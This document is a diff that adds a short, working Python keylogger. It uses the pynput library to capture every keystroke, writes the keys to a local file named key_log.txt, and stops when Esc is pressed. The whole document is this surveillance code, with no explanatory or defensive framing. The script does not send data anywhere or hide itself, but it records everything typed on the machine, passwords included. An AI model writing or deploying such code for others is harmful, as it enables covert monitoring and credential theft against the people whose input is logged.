@@ -1,0 +1,26 @@
+#python code
+
+from pynput.keyboard import Key, Listener
+
+# File to save keystrokes
+log_file = "key_log.txt"
+
+def on_press(key):
+    # Record key press and save to file
+    with open(log_file, "a") as file:
+        # Special case for space and newline for readability
+        if key == Key.space:
+            file.write(" ")
+        elif key == Key.enter:
+            file.write("\n")
+        else:
+            file.write(str(key).replace("'", ""))
+
+def on_release(key):
+    # Stop listener on pressing 'esc'
+    if key == Key.esc:
+        return False
+
+# Start listening to keystrokes
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
